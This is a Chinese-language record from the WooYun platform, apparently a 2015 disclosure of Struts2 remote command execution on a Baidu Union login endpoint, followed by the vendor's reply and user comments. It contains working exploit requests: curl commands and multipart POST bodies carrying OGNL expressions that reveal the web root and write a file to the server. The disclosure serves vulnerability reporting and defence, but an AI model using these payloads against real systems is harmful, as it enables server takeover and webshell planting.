{"id": 71545, "wybug_id": "wooyun-2015-0147301", "wybug_title": "百度某站st2命令执行(独特执行姿势)", "wybug_corp": "百度", "wybug_author": "loopx9", "wybug_date": "2015-10-17 00:01", "wybug_open_date": "2015-12-01 01:06", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行", "修复不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-01：\t细节向公众公开  简要描述： baidu惊现st2命令执行。。。 详细说明：  百度联盟 http://union.baidu.com/userlogin.action\nhttp://union.baidu.com/userlogin.action?redirect:/xxoo\n 返回空白\ncurl http://union.baidu.com/userlogin.action -d \"redirect:/xxoo=1\"\n返回空白\ncurl -i http://union.baidu.com/userlogin.action -F \"redirect:/xxoo=-1\"HTTP/1.1 302 FoundConnection: Keep-AliveContent-Length: 0Date: Fri, 16 Oct 2015 14:53:13 GMTLocation: http://union.baidu.com/xxoo;jsessionid=6A2E51000AE93C7F2126AC067338B598.worker1Server: Apache-Coyote/1.1Set-Cookie: JSESSIONID=6A2E51000AE93C7F2126AC067338B598.worker1; Path=/X-Prism-Spanid: 0X-Prism-Uid: 20151016_93E12A56-F41F-4228-934B-C310562131A2Content-Type: text/plain; charset=utf-8\n302跳转了。。。multipart表单没有检测？发现完全不用考虑参数名中的双引号，有点像正则的贪婪匹配模式，这是java web容器的特性?   漏洞证明：  获取web项目路径:\nPOST http://union.baidu.com/userlogin.action HTTP/1.1User-Agent: curl/7.33.0Host: union.baidu.comAccept: */*Proxy-Connection: Keep-AliveContent-Length: 236Content-Type: multipart/form-data; boundary=------------------------4a606c052a893987--------------------------4a606c052a893987Content-Disposition: form-data; name=\"redirect:/${#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletRequest\").getRealPath(\"/\")}\"-1--------------------------4a606c052a893987--\n\n\n写shell测试:\nPOST http://union.baidu.com/userlogin.action HTTP/1.1User-Agent: curl/7.33.0Host: union.baidu.comAccept: */*Proxy-Connection: Keep-AliveContent-Length: 232Content-Type: multipart/form-data; boundary=------------------------4a606c052a893987--------------------------4a606c052a893987Content-Disposition: form-data; name=\"redirect:/${\"x\"+(new java.io.PrintWriter(\"/home/work/union/htdocs/wooyun.jpg\")).append(\"wooyun\").close()}\"1--------------------------4a606c052a893987--\n\nhttp://union.baidu.com/wooyun.jpg\n\n\n   修复方案：  ...   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-17 01:04 厂商回复： 感谢提交，已通知修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-17 00:18 |    \t\tHRay \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:28        | 018)\t\t \n  这大半夜的，向应急的小伙伴致敬    \n     2015-10-17 00:54 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:198 漏洞数:34        | 不会弹吉它的黑客不是好歌手)\t\t \n  绝对是域名是他们的,业务不是他们的........    \n     2015-10-17 01:06 |    \t\t百度(乌云厂商)\t\t \n  @HRay 应急的小伙伴已开始应急    \n     2015-10-17 09:02 |    \t\t坏男孩-A_A \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 菜鸟一枚)\t\t \n  @百度 向应急的小伙伴致敬    \n     2015-10-17 10:45 |    \t\tLoveSnow \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:4        | 以正和，以奇胜！)\t\t \n   @loopx9，这是时间交是有点折腾应急响应的小伙伴了。    \n     2015-10-17 10:54 |    \t\tloopx9 \t\t\t( 普通白帽子  |\t\t\t        Rank:681 漏洞数:67        | ..)\t\t \n  是有些晚了。 向应急的小伙伴致敬    \n     2015-10-17 11:13 |    \t\tChora \t\t\t( 普通白帽子  |\t\t\t        Rank:337 漏洞数:22        | 生存、生活、生命。)\t\t \n  @loopx9 还是只有理解原理的JAVA牛才能变形。    \n     2015-10-17 13:04 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | 呵呵)\t\t \n  麻麻，我要去百度上班！    \n     2015-10-17 14:09 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  @百度 很想知道有多少位 职业应急小伙伴.    \n     2015-10-17 15:07 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:467 漏洞数:50        | 我有一个好想法！)\t\t \n  @loopx9 你这是个通用的方法啊，你发财了。    \n     2015-10-18 09:14 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  啊？！！！    \n     2015-10-18 12:56 |    \t\t心云 \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:27        | 遇见)\t\t \n  diaozhatian    \n     2015-10-20 11:11 |    \t\t子墨 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:24        | 天地不仁,以万物为刍狗;圣人不仁,以百姓为...)\t\t \n  期待独特执行姿势 ...    \n     2015-11-01 23:42 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1760 漏洞数:146        | 如果大海能够带走我的矮丑...)\t\t \n  陪审团成员觉得这个可以精华。    \n     2015-11-06 01:41 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:868 漏洞数:102        )\t\t \n  强！    \n     2015-11-06 09:08 |    \t\t坏男孩-A_A \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 菜鸟一枚)\t\t \n  @小胖子 精华?不会是新的通用漏洞姿式吧*-.-*    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}